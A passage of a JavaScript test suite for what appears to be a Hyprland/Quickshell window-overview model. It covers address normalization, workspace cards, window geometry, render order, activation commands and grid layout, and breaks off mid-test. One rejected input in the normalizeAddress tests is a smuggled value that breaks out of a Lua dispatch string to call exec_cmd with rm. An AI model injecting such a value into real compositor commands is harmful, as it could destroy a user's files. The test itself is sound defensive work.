import test from 'node:test';
import assert from 'node:assert/strict';
import {loadModel, fixtureJson} from './load.mjs';

const M = loadModel();

// Objects created inside the vm context have a different Object prototype,
// so strict deepEqual fails on identity. Compare by JSON round-trip instead.
function plain(value) {
  return JSON.parse(JSON.stringify(value));
}

// The real fixtures are re-captured from the live session by
// scripts/capture-fixtures.sh, so tests that read them assert invariants
// derived from the fixture itself, never the exact snapshot (which windows,
// how many). Synthetic scenarios keep their literals.
const ADDRESS_RE = /^0x[0-9a-f]+$/;
const EPS = 1e-9;

const real = {
  clients: fixtureJson('clients.json'),
  workspaces: fixtureJson('workspaces.json'),
  monitors: fixtureJson('monitors.json'),
};
const realMonitor = real.monitors.find(m => m.focused) || real.monitors[0];
const realActiveWsId = realMonitor.activeWorkspace.id;

// An independent (deliberately naive) statement of the drawable rule.
function drawable(c) {
  return !!c && c.mapped !== false && c.hidden !== true &&
    /^(0x)?[0-9a-f]+$/i.test(String(c.address || '').trim()) &&
    !!c.workspace && Number.isInteger(c.workspace.id) && c.workspace.id !== -1;
}

const realDrawable = real.clients.filter(drawable);
const realActiveClient = realDrawable.slice().sort((a, b) => a.focusHistoryID - b.focusHistoryID)[0];
// Quickshell's form (no 0x) on purpose: buildOverview must normalize it.
const realOpts = {
  activeWorkspaceId: realActiveWsId,
  activeAddress: realActiveClient ? realActiveClient.address.replace(/^0x/, '') : '',
};

function buildReal(opts = realOpts) {
  return M.buildOverview(real.clients, real.workspaces, real.monitors, opts);
}

function scenario(name) {
  return fixtureJson('synthetic-' + name + '.json');
}

function build(s, opts = s.opts) {
  return M.buildOverview(s.clients, s.workspaces, s.monitors, opts);
}

function cardById(cards, id) {
  return cards.find(c => c.id === id);
}

function addressesOf(card) {
  return plain(card.windows).map(w => w.address);
}

function assertRectInside(r, label) {
  for (const k of ['x', 'y', 'w', 'h']) {
    assert.equal(typeof r[k], 'number', label + '.' + k + ' is a number');
    assert.ok(Number.isFinite(r[k]), label + '.' + k + ' is finite');
  }
  assert.ok(r.x >= 0 && r.y >= 0, label + ' origin >= 0: ' + JSON.stringify(r));
  assert.ok(r.w >= 0.02 - EPS && r.h >= 0.02 - EPS, label + ' size >= MIN: ' + JSON.stringify(r));
  assert.ok(r.x + r.w <= 1 + EPS && r.y + r.h <= 1 + EPS, label + ' fits in [0,1]: ' + JSON.stringify(r));
}

function assertClose(actual, expected, label) {
  assert.ok(Math.abs(actual - expected) < 1e-9, label + ': expected ' + expected + ', got ' + actual);
}

function assertRect(actual, expected, label) {
  for (const k of ['x', 'y', 'w', 'h']) assertClose(actual[k], expected[k], label + '.' + k);
}

function tier(w) {
  return w.fullscreen ? 2 : (w.floating ? 1 : 0);
}

function assertRenderOrder(card) {
  for (let i = 1; i < card.windows.length; i++) {
    const a = card.windows[i - 1];
    const b = card.windows[i];
    const ok = tier(a) < tier(b) ||
      (tier(a) === tier(b) && (a.focusHistoryID > b.focusHistoryID ||
        (a.focusHistoryID === b.focusHistoryID && a.address < b.address)));
    assert.ok(ok, 'card ' + card.id + ': ' + a.address + ' must render below ' + b.address);
  }
}

// Deterministic shuffle (LCG) so order-independence tests are reproducible.
function shuffled(list, seed) {
  const out = list.slice();
  let s = seed;
  for (let i = out.length - 1; i > 0; i--) {
    s = (s * 1103515245 + 12345) % 2147483648;
    const j = s % (i + 1);
    [out[i], out[j]] = [out[j], out[i]];
  }
  return out;
}

// ---- API surface -----------------------------------------------------------

test('Model.js exposes the functions the QML depends on', () => {
  const names = ['normalizeAddress', 'isSpecialWorkspace', 'workspaceLabel', 'workAreaFor', 'relativeRect',
    'buildOverview', 'gridLayout', 'flattenWindows', 'initialIndex', 'navigate', 'stepIndex',
    'focusWindowCmd', 'focusWorkspaceCmd', 'mostRecentWindow', 'cardActivationCmd', 'mostRecentAddress'];
  for (const name of names) assert.equal(typeof M[name], 'function', name);
});

// ---- normalizeAddress ------------------------------------------------------

test('normalizeAddress maps hyprctl and Quickshell forms to lowercase 0x…', () => {
  assert.equal(M.normalizeAddress('0x5cd959cd1920'), '0x5cd959cd1920');
  assert.equal(M.normalizeAddress('5cd959cd1920'), '0x5cd959cd1920');
  assert.equal(M.normalizeAddress('0X5CD959CD1920'), '0x5cd959cd1920');
  assert.equal(M.normalizeAddress('5CD959cd1920'), '0x5cd959cd1920');
  assert.equal(M.normalizeAddress('  0x5cd9\n'), '0x5cd9');
  assert.equal(M.normalizeAddress(1234), '0x1234');
  assert.equal(M.normalizeAddress('0x0'), '0x0');
});

test('normalizeAddress rejects anything that is not pure hex', () => {
  const bad = ['', ' ', '0x', 'x12', '0x12g', 'zz', '0x0x12', '-12', '12 34', '0x12;', 'address:0x12',
    '0x12" }) hl.dsp.exec_cmd("rm', '0x12\n0x34', null, undefined, {}, [], ['0x12'], true, NaN, Infinity,
    -5, 1.5, {toString() { return '0x12'; }}];
  for (const value of bad) {
    assert.equal(M.normalizeAddress(value), '', 'for ' + String(value));
  }
});

test('normalizeAddress leaves every real fixture address well-formed', () => {
  for (const c of real.clients) {
    const a = M.normalizeAddress(c.address);
    assert.match(a, ADDRESS_RE);
    assert.equal(M.normalizeAddress(a.slice(2)), a, 'Quickshell form round-trips for ' + a);
  }
});

// ---- isSpecialWorkspace / workspaceLabel -----------------------------------

test('isSpecialWorkspace keys off the name prefix, not the id sign', () => {
  assert.equal(M.isSpecialWorkspace({id: -98, name: 'special:scratchpad'}), true);
  assert.equal(M.isSpecialWorkspace({id: -99, name: 'special:'}), true);
  assert.equal(M.isSpecialWorkspace({id: -1337, name: 'web'}), false);
  assert.equal(M.isSpecialWorkspace({id: 3, name: '3'}), false);
  assert.equal(M.isSpecialWorkspace({id: -98, name: 'special'}), false);
  assert.equal(M.isSpecialWorkspace({id: -98}), false);
  assert.equal(M.isSpecialWorkspace({name: 42}), false);
  for (const value of [null, undefined, {}, 'special:x', 0]) {
    assert.equal(M.isSpecialWorkspace(value), false, 'for ' + JSON.stringify(value));
  }
});

test('workspaceLabel shows numbers, names, and specials without the prefix', () => {
  assert.equal(M.workspaceLabel({id: 3, name: '3'}), '3');
  assert.equal(M.workspaceLabel({id: 3}), '3');
  assert.equal(M.workspaceLabel({id: 4, name: ''}), '4');
  assert.equal(M.workspaceLabel({id: 12, name: 'chat'}), 'chat');
  assert.equal(M.workspaceLabel({id: -1337, name: 'web'}), 'web');
  assert.equal(M.workspaceLabel({id: -98, name: 'special:scratchpad'}), 'scratchpad');
  assert.equal(M.workspaceLabel({id: -99, name: 'special:'}), 'special');
  assert.equal(M.workspaceLabel({name: 'special:magic'}), 'magic');
  for (const value of [null, undefined, {}, {name: ''}, 'x', 7]) {
    assert.equal(M.workspaceLabel(value), '', 'for ' + JSON.stringify(value));
  }
});

// ---- workAreaFor -----------------------------------------------------------

test('workAreaFor removes the reserved bar strip from the real monitor', () => {
  const m = realMonitor;
  const area = plain(M.workAreaFor(m));
  const [l, t, r, b] = m.reserved;
  const lw = (m.transform % 2 === 1 ? m.height : m.width) / m.scale;
  const lh = (m.transform % 2 === 1 ? m.width : m.height) / m.scale;
  assert.deepEqual(area, {x: m.x + l, y: m.y + t, w: lw - l - r, h: lh - t - b});
});

test('workAreaFor divides by scale and swaps width/height for odd transforms', () => {
  const base = {x: 1920, y: 0, width: 2880, height: 1920, scale: 1.5, reserved: [0, 30, 0, 0]};
  for (const transform of [1, 3, 5, 7]) {
    assert.deepEqual(plain(M.workAreaFor({...base, transform})), {x: 1920, y: 30, w: 1280, h: 1890}, 'transform ' + transform);
  }
  for (const transform of [0, 2, 4, 6]) {
    assert.deepEqual(plain(M.workAreaFor({...base, transform})), {x: 1920, y: 30, w: 1920, h: 1250}, 'transform ' + transform);
  }
  assert.deepEqual(plain(M.workAreaFor({x: 0, y: 0, width: 3840, height: 2400, scale: 2, reserved: [10, 20, 30, 40]})),
    {x: 10, y: 20, w: 1880, h: 1140});
});

test('workAreaFor tolerates missing scale, position and reserved fields', () => {
  assert.deepEqual(plain(M.workAreaFor({width: 1920, height: 1200})), {x: 0, y: 0, w: 1920, h: 1200});
  for (const scale of [0, -1, NaN, '2', null]) {
    assert.deepEqual(plain(M.workAreaFor({width: 1920, height: 1200, scale})), {x: 0, y: 0, w: 1920, h: 1200}, 'scale ' + scale);
  }
  assert.deepEqual(plain(M.workAreaFor({width: 1920, height: 1200, reserved: [5]})), {x: 5, y: 0, w: 1915, h: 1200});
  assert.deepEqual(plain(M.workAreaFor({width: 1920, height: 1200, reserved: 'nope'})), {x: 0, y: 0, w: 1920, h: 1200});
  assert.deepEqual(plain(M.workAreaFor({width: 100, height: 100, reserved: [80, 80, 80, 80]})), {x: 80, y: 80, w: 1, h: 1});
});

test('workAreaFor returns null for a missing or sizeless monitor', () => {
  for (const value of [null, undefined, {}, 'eDP-1', 0, {width: 0, height: 1200}, {width: 1920},
    {width: '1920', height: 1200}, {width: -1920, height: 1200}]) {
    assert.equal(M.workAreaFor(value), null, 'for ' + JSON.stringify(value));
  }
});

// ---- relativeRect ----------------------------------------------------------

test('relativeRect expresses a real window as fractions of its work area', () => {
  let exact = 0;
  for (const c of realDrawable) {
    const area = M.workAreaFor(real.monitors.find(m => m.id === c.monitor));
    const r = M.relativeRect(c, area);
    assertRectInside(r, c.address);
    const raw = {
      x: (c.at[0] - area.x) / area.w,
      y: (c.at[1] - area.y) / area.h,
      w: c.size[0] / area.w,
      h: c.size[1] / area.h,
    };
    // Windows fully inside the work area come through unclamped. (Fullscreen
    // and scrolled-off windows are clamped; see the next test.)
    if (raw.x >= 0 && raw.y >= 0 && raw.x + raw.w <= 1 && raw.y + raw.h <= 1 && raw.w >= 0.02 && raw.h >= 0.02) {
      assertRect(r, raw, c.address);
      exact++;
    }
  }
  assert.ok(exact > 0, 'fixture has at least one window inside its work area');
});

test('relativeRect clamps windows that hang off the work area', () => {
  const area = {x: 0, y: 30, w: 1920, h: 1170};
  // Fullscreen covers the bar strip: pulled back to exactly the card.
  assertRect(M.relativeRect({at: [0, 0], size: [1920, 1200]}, area), {x: 0, y: 0, w: 1, h: 1}, 'fullscreen');
  // A scrolling-layout column parked off to the right stays a sliver at the edge.
  assertRect(M.relativeRect({at: [2500, 42], size: [941, 1146]}, area), {x: 0.98, y: 12 / 1170, w: 0.02, h: 1146 / 1170}, 'off right');
  // Off to the left: origin clamps to 0 and the width is kept.
  assertRect(M.relativeRect({at: [-500, 42], size: [941, 1146]}, area), {x: 0, y: 12 / 1170, w: 941 / 1920, h: 1146 / 1170}, 'off left');
  // Tiny windows grow to the clickable minimum.
  assertRect(M.relativeRect({at: [100, 130], size: [2, 3]}, area), {x: 100 / 1920, y: 100 / 1170, w: 0.02, h: 0.02}, 'tiny');
  // Zero or negative sizes too.
  assertRect(M.relativeRect({at: [0, 30], size: [0, -50]}, area), {x: 0, y: 0, w: 0.02, h: 0.02}, 'zero size');
});

test('relativeRect stays inside [0,1] for arbitrary geometry', () => {
  let s = 42;
  const rand = (lo, hi) => {
    s = (s * 1103515245 + 12345) % 2147483648;
    return lo + (s / 2147483648) * (hi - lo);
  };
  for (let i = 0; i < 2000; i++) {
    const area = {x: rand(-3000, 3000), y: rand(-3000, 3000), w: rand(1, 4000), h: rand(1, 4000)};
    const client = {at: [rand(-6000, 6000), rand(-6000, 6000)], size: [rand(-100, 8000), rand(-100, 8000)]};
    assertRectInside(M.relativeRect(client, area), 'sample ' + i);
  }
});

test('relativeRect falls back to the whole card on missing data', () => {
  const full = {x: 0, y: 0, w: 1, h: 1};
  const area = {x: 0, y: 30, w: 1920, h: 1170};
  const cases = [
    [null, area], [undefined, area], [{}, area], [{at: [1, 2]}, area], [{size: [1, 2]}, area],
    [{at: [1], size: [1, 2]}, area], [{at: ['1', 2], size: [1, 2]}, area], [{at: 'x', size: 'y'}, area],
    [{at: [1, 2], size: [3, 4]}, null], [{at: [1, 2], size: [3, 4]}, undefined], [{at: [1, 2], size: [3, 4]}, {}],
    [{at: [1, 2], size: [3, 4]}, {x: 0, y: 0, w: 0, h: 100}], [{at: [1, 2], size: [3, 4]}, {x: 0, y: 0, w: 100, h: NaN}],
  ];
  for (const [client, a] of cases) {
    assert.deepEqual(plain(M.relativeRect(client, a)), full, 'for ' + JSON.stringify([client, a]));
  }
});

// ---- buildOverview: real fixtures ------------------------------------------

test('buildOverview makes one card per occupied workspace plus the active one', () => {
  const cards = buildReal();
  const ids = new Set(realDrawable.map(c => c.workspace.id));
  const activeWs = real.workspaces.find(w => w.id === realActiveWsId);
  const activeIsReal = Number.isInteger(realActiveWsId) && realActiveWsId !== -1;
  if (activeIsReal && !(activeWs && activeWs.name.startsWith('special:'))) ids.add(realActiveWsId);
  assert.equal(cards.length, ids.size);
  assert.deepEqual(plain(cards.map(c => c.id)).sort((a, b) => a - b), [...ids].sort((a, b) => a - b));
  const total = cards.reduce((n, c) => n + c.windows.length, 0);
  assert.equal(total, realDrawable.length, 'every drawable client drawn exactly once');
});

test('buildOverview orders real cards numbered -> named -> special', () => {
  const cards = buildReal();
  const group = c => (c.special ? 2 : (c.id > 0 && c.name === String(c.id) ? 0 : 1));
  for (let i = 1; i < cards.length; i++) {
    const a = cards[i - 1];
    const b = cards[i];
    assert.ok(group(a) <= group(b), 'group order at ' + i);
    if (group(a) === 0 && group(b) === 0) assert.ok(a.id < b.id, 'numbered ascending at ' + i);
  }
  for (const card of cards) {
    assert.equal(card.special, card.name.startsWith('special:'));
    assert.ok(card.label.length > 0, 'label for ' + card.id);
    assert.ok(!card.label.startsWith('special:'), 'label drops the prefix');
    assert.equal(card.label, M.workspaceLabel({id: card.id, name: card.name}));
  }
});

test('buildOverview marks exactly the active workspace and window from the real snapshot', () => {
  const cards = buildReal();
  const activeCards = cards.filter(c => c.isActive);
  assert.equal(activeCards.length, 1);
  assert.equal(activeCards[0].id, realActiveWsId);
  const activeWindows = plain(cards).flatMap(c => c.windows).filter(w => w.isActive);
  assert.equal(activeWindows.length, realActiveClient ? 1 : 0);
  if (realActiveClient) {
    assert.equal(activeWindows[0].address, M.normalizeAddress(realActiveClient.address));
    assert.equal(activeWindows[0].focusHistoryID, realActiveClient.focusHistoryID);
  }
});

test('buildOverview real windows are normalized, unique, in range and in render order', () => {
  const cards = buildReal();
  const seen = new Set();
  for (const card of cards) {
    const ws = real.workspaces.find(w => w.id === card.id);
    const monitorId = ws ? ws.monitorID : realMonitor.id;
    const area = plain(M.workAreaFor(real.monitors.find(m => m.id === monitorId)));
    assert.equal(card.monitorId, monitorId);
    assert.deepEqual(plain(card.area), area);
    assertClose(card.aspect, area.w / area.h, 'aspect of ' + card.id);
    assertRenderOrder(card);
    for (const w of card.windows) {
      assert.match(w.address, ADDRESS_RE);
      assert.ok(!seen.has(w.address), 'unique ' + w.address);
      seen.add(w.address);
      assertRectInside(w.rect, w.address);
      const src = real.clients.find(c => M.normalizeAddress(c.address) === w.address);
      assert.ok(src, 'window comes from a fixture client');
      assert.equal(src.workspace.id, card.id, 'window sits on its own workspace card');
      assert.equal(w.className, src.class || src.initialClass || '');
      assert.equal(w.title, src.title || '');
      assert.equal(w.floating, !!src.floating);
      assert.equal(w.pinned, !!src.pinned);
      assert.equal(w.groupSize, (src.grouped || []).length);
      assert.equal(w.extraTabs, Math.max(0, w.groupSize - 1));
    }
  }
});

test('buildOverview output is independent of client order and JSON-stable', () => {
  const reference = JSON.stringify(buildReal());
  for (const seed of [1, 7, 99, 12345]) {
    const cards = M.buildOverview(shuffled(real.clients, seed), shuffled(real.workspaces, seed + 1),
      real.monitors, realOpts);
    assert.equal(JSON.stringify(cards), reference, 'seed ' + seed);
  }
  // Overview.qml diffs rebuilds with JSON.stringify, so the model must survive a round trip.
  assert.deepEqual(plain(JSON.parse(reference)), plain(buildReal()));
});

test('every real card can be activated with a safe dispatch string', () => {
  for (const card of buildReal()) {
    for (const lua of [true, false]) {
      const cmd = M.cardActivationCmd(card, lua);
      if (card.special) {
        const recent = M.mostRecentWindow(card);
        assert.equal(cmd, M.focusWindowCmd(recent.address, lua), 'special card focuses its most recent window');
      } else if (card.id > 0 && card.name === String(card.id)) {
        assert.equal(cmd, M.focusWorkspaceCmd(card.id, lua));
      }
      assert.ok(cmd !== '' || card.windows.length === 0, 'card ' + card.id + ' activates');
    }
  }
});

// ---- buildOverview: synthetic scenarios ------------------------------------

test('floating windows draw above tiled ones regardless of focus history', () => {
  const cards = build(scenario('stacking'));
  const ws1 = cardById(cards, 1);
  assert.deepEqual(addressesOf(ws1), ['0xa1', '0xa2', '0xa3']);
  assert.equal(ws1.windows[2].floating, true);
  // The floating window is the least recently focused, but still on top.
  assert.ok(ws1.windows[2].focusHistoryID > ws1.windows[0].focusHistoryID);
  assertRect(ws1.windows[2].rect, {x: 500 / 1920, y: 270 / 1170, w: 800 / 1920, h: 600 / 1170}, 'floating rect');
  assertRenderOrder(ws1);
});

test('fullscreen windows form the top tier; maximized stays in its own tier', () => {
  const cards = build(scenario('stacking'));
  const ws2 = cardById(cards, 2);
  // tiled (maximized 0xb1 less recent than 0xb2), floating, then fullscreen (3 before 2 by recency).
  assert.deepEqual(addressesOf(ws2), ['0xb1', '0xb2', '0xb3', '0xb5', '0xb4']);
  const byAddr = Object.fromEntries(plain(ws2.windows).map(w => [w.address, w]));
  assert.equal(byAddr['0xb1'].fullscreen, false, 'fullscreen 1 is maximized, not fullscreen');
  assert.equal(byAddr['0xb4'].fullscreen, true);
  assert.equal(byAddr['0xb5'].fullscreen, true, 'fullscreen 3 counts');
  assert.equal(byAddr['0xb5'].floating, true, 'a floating fullscreen window keeps its floating flag');
  assert.equal(byAddr['0xb3'].pinned, true);
  assert.deepEqual(byAddr['0xb4'].rect, {x: 0, y: 0, w: 1, h: 1});
  assertRenderOrder(ws2);
});

test('fullscreen === true is accepted as the fullscreen tier', () => {
  const s = scenario('stacking');
  s.clients = s.clients.map(c => (c.address === '0xa1' ? {...c, fullscreen: true} : c));
  const ws1 = cardById(build(s), 1);
  assert.deepEqual(addressesOf(ws1), ['0xa2', '0xa3', '0xa1']);
  assert.equal(ws1.windows[2].fullscreen, true);
});

test('active window and card are marked, with the active address in Quickshell form', () => {
  const cards = build(scenario('stacking'));
  assert.deepEqual(plain(cards.map(c => [c.id, c.isActive])), [[1, false], [2, true]]);
  const active = plain(cards).flatMap(c => c.windows).filter(w => w.isActive);
  assert.deepEqual(active.map(w => w.address), ['0xb2']);
});

test('a 3-tab group draws only the visible tab with two extra tabs', () => {
  const cards = build(scenario('group'));
  assert.equal(cards.length, 1);
  const ws3 = cards[0];
  assert.deepEqual(addressesOf(ws3), ['0xc5', '0xc1']);
  const [plainWin, groupWin] = plain(ws3.windows);
  assert.equal(groupWin.groupSize, 3);
  assert.equal(groupWin.extraTabs, 2);
  assert.equal(groupWin.isActive, true, 'active address given as 0XC1');
  assert.equal(plainWin.groupSize, 0);
  assert.equal(plainWin.extraTabs, 0);
  assert.equal(plainWin.isActive, false);
});

test('an empty active workspace still gets a card with no windows', () => {
  const cards = build(scenario('empty-active'));
  assert.deepEqual(plain(cards.map(c => c.id)), [1, 2, 4, -98]);
  const ws4 = cardById(cards, 4);
  assert.equal(ws4.isActive, true);
  assert.deepEqual(plain(ws4.windows), []);
  assert.equal(ws4.label, '4');
  assert.equal(ws4.special, false);
  assert.equal(ws4.monitorId, 0);
  assert.deepEqual(plain(ws4.area), {x: 0, y: 30, w: 1920, h: 1170});
  assertClose(ws4.aspect, 1920 / 1170, 'aspect');
  assert.equal(M.cardActivationCmd(ws4, false), 'workspace 4');
  assert.equal(cards.filter(c => c.isActive).length, 1);
  assert.equal(plain(cards).flatMap(c => c.windows).filter(w => w.isActive).length, 0, 'no active address given');
});

test('an active workspace missing from the list is synthesized; invalid or special ones are not', () => {
  const s = scenario('empty-active');
  const synth = build(s, {activeWorkspaceId: 9});
  assert.deepEqual(plain(synth.map(c => c.id)), [1, 2, 9, -98]);
  const ws9 = cardById(synth, 9);
  assert.equal(ws9.name, '9');
  assert.equal(ws9.label, '9');
  assert.equal(ws9.isActive, true);
  assert.equal(ws9.monitorId, 0, 'the focused monitor');
  for (const activeWorkspaceId of [-1, '4', NaN, null, undefined, 4.5]) {
    const cards = build(s, {activeWorkspaceId});
    assert.deepEqual(plain(cards.map(c => c.id)), [1, 2, -98], 'for ' + String(activeWorkspaceId));
    assert.equal(cards.filter(c => c.isActive).length, 0);
  }
  // An empty special workspace never becomes a card, even when "active".
  const noScratch = {...s, clients: s.clients.filter(c => c.workspace.id !== -98)};
  assert.deepEqual(plain(build(noScratch, {activeWorkspaceId: -98}).map(c => c.id)), [1, 2]);
  // An occupied special workspace can still be flagged active.
  assert.equal(cardById(build(s, {activeWorkspaceId: -98}), -98).isActive, true);
});

test('named workspaces (even with negative ids) sort after numbered ones, specials last', () => {
  const cards = build(scenario('named'));
  assert.deepEqual(plain(cards.map(c => c.id)), [1, 3, 5, 10, 12, -1337, -97, -98]);
  assert.deepEqual(plain(cards.map(c => c.label)), ['1', '3', '5', '10', 'chat', 'web', 'magic', 'scratchpad']);
  assert.deepEqual(plain(cards.map(c => c.special)), [false, false, false, false, false, false, true, true]);
  // Workspace 5 is not in the list: its info comes from the client.
  const ws5 = cardById(cards, 5);
  assert.equal(ws5.name, '5');
  assert.equal(ws5.monitorId, 0, 'monitor from its window');
  assert.equal(cardById(cards, -1400), undefined, 'empty named workspace has no card');
  assert.equal(cardById(cards, 3).isActive, true);
});

test('card activation: numbered switches workspace, named and special focus their window', () => {
  const cards = build(scenario('named'));
  const cmd = (id, lua) => M.cardActivationCmd(cardById(cards, id), lua);
  assert.equal(cmd(10, false), 'workspace 10');
  assert.equal(cmd(10, true), 'hl.dsp.focus({ workspace = "10" })');
  assert.equal(cmd(12, false), 'focuswindow address:0x104', 'named workspace "chat" with positive id');
  assert.equal(cmd(-1337, true), 'hl.dsp.focus({ window = "address:0x105" })');
  assert.equal(cmd(-98, true), 'hl.dsp.focus({ window = "address:0x107" })');
  assert.equal(cmd(-97, false), 'focuswindow address:0x106');
});

test('windows on a rotated, scaled second monitor use that monitor\'s logical work area', () => {
  const cards = build(scenario('multimonitor'));
  assert.deepEqual(plain(cards.map(c => [c.id, c.monitorId])), [[1, 0], [6, 1], [7, 1]]);
  const ws1 = cardById(cards, 1);
  assert.deepEqual(plain(ws1.area), {x: 0, y: 30, w: 1920, h: 1170});
  const ws6 = cardById(cards, 6);
  assert.deepEqual(plain(ws6.area), {x: 1920, y: 30, w: 1280, h: 1890});
  assertClose(ws6.aspect, 1280 / 1890, 'portrait aspect');
  assert.ok(ws6.isActive);
  const d = Object.fromEntries(plain(ws6.windows).map(w => [w.address, w]));
  assertRect(d['0xd2'].rect, {x: 10 / 1280, y: 10 / 1890, w: 1260 / 1280, h: 900 / 1890}, '0xd2');
  assertRect(d['0xd3'].rect, {x: 10 / 1280, y: 920 / 1890, w: 1260 / 1280, h: 970 / 1890}, '0xd3');
  assert.equal(d['0xd3'].isActive, true);
  // Workspace 7 is not in the list: the card follows its window to DP-1.
  const ws7 = cardById(cards, 7);
  assert.deepEqual(plain(ws7.area), {x: 1920, y: 30, w: 1280, h: 1890});
  assertRect(ws7.windows[0].rect, {x: 80 / 1280, y: 470 / 1890, w: 640 / 1280, h: 480 / 1890}, '0xd4');
  assertRect(ws1.windows[0].rect, {x: 12 / 1920, y: 12 / 1170, w: 1896 / 1920, h: 1146 / 1170}, '0xd1');
});

test('a window measures against its own monitor, else its card\'s monitor', () => {
  const s = scenario('multimonitor');
  // 0xd2 claims eDP-1 while its workspace lives on DP-1: eDP-1's area wins.
  const moved = {...s, clients: s.clients.map(c => (c.address === '0xd2' ? {...c, at: [960, 615], size: [480, 234], monitor: 0} : c))};
  const ws6 = cardById(build(moved), 6);
  const d2 = plain(ws6.windows).find(w => w.address === '0xd2');
  assertRect(d2.rect, {x: 0.5, y: 0.5, w: 0.25, h: 0.2}, '0xd2');
  // The card itself still follows the workspace's monitorID, not its first window.
  assert.equal(ws6.monitorId, 1);
  assert.deepEqual(plain(ws6.area), {x: 1920, y: 30, w: 1280, h: 1890});
  // An unknown monitor id falls back to the card's area.
  const lost = {...s, clients: s.clients.map(c => (c.address === '0xd3' ? {...c, monitor: 9} : c))};
  const d3 = plain(cardById(build(lost), 6).windows).find(w => w.address === '0xd3');
  assertRect(d3.rect, {x: 10 / 1280, y: 920 / 1890, w: 1260 / 1280, h: 970 / 1890}, '0xd3');
});

test('garbage and partial clients are skipped without throwing', () => {
  const s = scenario('invalid');
  const cards = build(s);
  assert.equal(cards.length, 1, 'duplicate of 0xe5 on workspace 2 must not create a card');
  const ws1 = cards[0];
  assert.equal(ws1.id, 1);
  assert.equal(ws1.name, '1');
  assert.equal(ws1.monitorId, 0);
  assert.deepEqual(plain(ws1.area), {x: 0, y: 0, w: 1920, h: 1200});
  assertClose(ws1.aspect, 1.6, 'aspect');
  assert.equal(ws1.isActive, false);
  // 0xe4 has no focus history, so it sorts as least recent (bottom).
  assert.deepEqual(addressesOf(ws1), ['0xe4', '0xe5']);
  const [e4, e5] = plain(ws1.windows);
  assert.deepEqual(e4, {
    address: '0xe4', className: '', title: '', floating: false, fullscreen: false, pinned: false,
    groupSize: 0, extraTabs: 0, isActive: false, focusHistoryID: 1e6, rect: {x: 0, y: 0, w: 1, h: 1},
  });
  assert.equal(e5.className, 'valid');
  assert.deepEqual(e5.rect, {x: 0.5, y: 0, w: 0.5, h: 1});
});

test('buildOverview never throws on empty, null or wrongly typed input', () => {
  const inputs = [undefined, null, {}, [], 'x', 42, [null], [{}], [[]], {length: 2}];
  for (const a of inputs) {
    for (const opts of [undefined, null, {}, 'x', {activeWorkspaceId: 'x', activeAddress: {}}]) {
      const cards = M.buildOverview(a, a, a, opts);
      assert.ok(Array.isArray(cards));
      assert.equal(cards.length, 0, 'for ' + JSON.stringify([a, opts]));
    }
  }
  assert.deepEqual(plain(M.buildOverview()), []);
});

test('buildOverview synthesizes the active card even with no data at all', () => {
  const cards = plain(M.buildOverview(null, null, null, {activeWorkspaceId: 1}));
  assert.deepEqual(cards, [{
    id: 1, name: '1', label: '1', special: false, isActive: true, monitorId: 0, area: null, aspect: 1.6, windows: [],
  }]);
});

test('buildOverview draws windows full-card when no monitor is known', () => {
  const s = scenario('stacking');
  const cards = M.buildOverview(s.clients, s.workspaces, [], s.opts);
  for (const card of cards) {
    assert.equal(card.area, null);
    assert.equal(card.aspect, 1.6);
    for (const w of card.windows) assert.deepEqual(plain(w.rect), {x: 0, y: 0, w: 1, h: 1});
  }
});

test('buildOverview accepts array-like lists (QML sequence wrappers)', () => {
  const s = scenario('group');
  const arrayLike = list => Object.assign({length: list.length}, list);
  const cards = M.buildOverview(arrayLike(s.clients), arrayLike(s.workspaces), arrayLike(s.monitors), s.opts);
  assert.equal(JSON.stringify(cards), JSON.stringify(build(s)));
});

test('negative or missing focusHistoryID sorts as least recent', () => {
  const base = {mapped: true, hidden: false, at: [0, 30], size: [100, 100], workspace: {id: 1, name: '1'}, monitor: 0};
  const clients = [
    {...base, address: '0x1', focusHistoryID: 0},
    {...base, address: '0x2', focusHistoryID: -1},
    {...base, address: '0x3'},
    {...base, address: '0x4', focusHistoryID: 5},
  ];
  const card = M.buildOverview(clients, [], [], {})[0];
  assert.deepEqual(addressesOf(card), ['0x2', '0x3', '0x4', '0x1']);
  assert.equal(card.windows[0].focusHistoryID, 1e6);
  assert.equal(M.mostRecentWindow(card).address, '0x1');
});

// ---- gridLayout ------------------------------------------------------------

function assertGridSane(g, count, availW, availH, gap) {
  assert.equal(g.cells.length, count);
  for (const k of ['cardW', 'boxH', 'cardH']) assert.ok(Number.isInteger(g[k]), k + ' is an integer');
  for (const c of g.cells) {
    assert.ok(c.x >= 0 && c.y >= 0, 'cell inside: ' + JSON.stringify(c));
    assert.ok(c.x + g.cardW <= availW && c.y + g.cardH <= availH, 'cell fits: ' + JSON.stringify(c));
  }
  // Cards never overlap: same-row neighbours are exactly one card + gap apart.
  for (let i = 1; i < count; i++) {
    if (Math.floor(i / g.cols) === Math.floor((i - 1) / g.cols)) {
      assert.equal(g.cells[i].x - g.cells[i - 1].x, g.cardW + gap);
      assert.equal(g.cells[i].y, g.cells[i - 1].y);
    }
  }
}

test('gridLayout puts 8 cards on a laptop screen in a 3x3 grid', () => {
  const aspect = 1920 / 1170;
  const g = plain(M.gridLayout(8, 1880, 1100, aspect, 16, 28));
  assert.equal(g.cols, 3);
  assert.equal(g.rows, 3);
  // Height-bound: ((1100 - 2*16) / 3 - 28) * aspect = 538.2…
  assert.equal(g.cardW, 538);
  assert.equal(g.boxH, Math.floor(538 / aspect));
  assert.equal(g.cardH, 28 + g.boxH);
  assertGridSane(g, 8, 1880, 1100, 16);
  // Block centered vertically.
  const top = g.cells[0].y;
  const bottom = 1100 - (g.cells[7].y + g.cardH);
  assert.ok(Math.abs(top - bottom) <= 1, 'vertical centering ' + top + ' vs ' + bottom);
  // Full rows centered horizontally; the 2-card last row centered on its own.
  const left = g.cells[0].x;
  const right = 1880 - (g.cells[2].x + g.cardW);
  assert.ok(Math.abs(left - right) <= 1, 'full row centering');
  const lastLeft = g.cells[6].x;
  const lastRight = 1880 - (g.cells[7].x + g.cardW);
  assert.ok(Math.abs(lastLeft - lastRight) <= 1, 'last row centering');
  assert.ok(lastLeft > left, 'short last row is inset');
  // Plan example: 8 cards on the full 1920x1200 screen is also 3x3.
  const full = M.gridLayout(8, 1920, 1200, aspect, 16, 28);
  assert.deepEqual([full.cols, full.rows], [3, 3]);
});

test('gridLayout handles a single card and wide/tall areas', () => {
  const one = plain(M.gridLayout(1, 1000, 800, 1.6, 10, 20));
  assert.equal(one.cols, 1);
  assert.equal(one.rows, 1);
  // Height-bound: (800 - 20) * 1.6 = 1248 > 1000, so width-bound 1000.
